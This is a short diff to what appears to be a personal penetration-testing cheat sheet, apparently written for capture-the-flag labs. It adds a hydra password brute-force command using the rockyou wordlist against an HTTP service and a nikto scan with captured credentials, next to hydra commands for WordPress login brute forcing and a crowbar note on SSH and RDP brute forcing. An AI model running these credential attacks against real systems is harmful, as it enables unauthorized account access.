@@ -311,6 +311,11 @@ wc # word count
 	//for bruteforce username:  hydra -L username -p test 192.168.56.156 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username" -t 40 -v
 	//for passwd: hydra -l elliot -P username 192.168.56.156 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 40 -v
 	//the content of 'F=' only the response word, and user&pass
+	//for http-get
+		hydra -l joker -P /home/ed/tools/rockyou.txt 10.201.2.175 -s 8080 http-get -t 32 -f -v
+//nikto can be userd with id 
+		nikto -h http://10.201.59.203:8080/ -id joker:hannah
+
     crowbar
         ssh pub key brute, and win RDP psw brute
 //account fuzz
